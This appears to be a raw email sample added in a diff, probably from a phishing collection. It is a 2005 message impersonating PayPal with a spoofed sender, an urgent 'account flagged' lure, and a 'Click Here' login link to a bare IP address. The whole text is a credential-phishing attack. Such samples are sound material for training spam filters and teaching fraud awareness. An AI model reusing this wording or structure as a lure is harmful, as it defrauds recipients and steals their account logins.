@@ -1,0 +1,95 @@
+Return-Path: <service@paypal.com>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from mail1.monkey.org (mail1.monkey.org [65.23.81.153])
+	by naughty.monkey.org (Postfix) with ESMTP id D26CF536E29
+	for <jose@login.monkey.org>; Tue, 21 Jun 2005 08:04:02 -0400 (EDT)
+Received: from 10.1.1.3 (unknown [81.215.209.225])
+	by mail1.monkey.org (Postfix) with SMTP id A3DBF85AF6D
+	for <jose@monkey.org>; Tue, 21 Jun 2005 08:04:00 -0400 (EDT)
+Received: from 97.4.4.2 by ; Tue, 21 Jun 2005 16:00:07 +0300
+Message-ID: <S271712.zmail@msn.com>
+From: "service@paypal.com" <service@paypal.com>
+Reply-To: "service@paypal.com" <service@paypal.com>
+To: jose@monkey.org
+Subject: Account Verification Required
+Date: Tue, 21 Jun 2005 10:00:07 -0300
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--570110146099587"
+X-Priority: 3
+X-IP: 167.142.64.180
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 23
+
+----570110146099587
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<P><Font style=3D"font-family:courier new,verdana,arial; font-size:12px"><=
+BR>
+
+Dear PayPal Member,<BR><BR>
+
+PayPal is committed to maintaining a safe environment for its community of=
+<BR>
+buyers and sellers. To protect the security of your account, PayPal employ=
+s<BR>
+some of the most advanced security systems in the world and our anti-fraud=
+<BR>
+teams regularly screen the PayPal system for unusual activity.<BR><BR>
+
+Recently, our Account Review Team identified some unusual activity in your=
+<BR>
+account. In accordance with PayPal's User Agreement and to ensure that you=
+r<BR>
+account has not been compromised, access to your account was flagged. Your=
+<BR>
+account will remain flagged until this issue has been resolved. <BR>
+This is a fraud prevention measure meant to ensure that your account is no=
+t<BR>
+compromised.<BR><BR>
+
+ In order to secure your account and quickly restore full access, we may<B=
+R>
+require some specific information from you for the following reason: <BR><=
+BR>
+
+Our system requires further account verification. <BR><BR>
+ 
+Case ID Number: PP-056-245-481<BR>
+We encourage you to log in and restore full access as soon as possible.<BR=
+>
+Should your account remain flagged for an extended period of time, <BR>
+it may result in further limitations on the use of your account or<BR>
+may result in eventual account closure.<BR><BR>
+----------------------------------------------------------------------<BR>=
+
+Please 
+<A HREF=3D"http://81.215.209.225/paypal2/login.htm?session=3Dsecure&cmd=3D=
+update">
+
+<B>Click Here </B></A>
+ to log in and restore full access to your account.<BR>
+ ----------------------------------------------------------------------<BR=
+><BR>
+
+Thank you for your prompt attention to this matter. Please understand that=
+<BR>
+this is a security measure meant to help protect you and your account. We<=
+BR>
+apologize for any inconvenience.<BR><BR><BR>
+
+
+Sincerely,<BR>
+PayPal Account Review Department<BR><BR>
+
+PayPal Email ID PP562
+
+</FONT>
+
+
+----570110146099587--
+
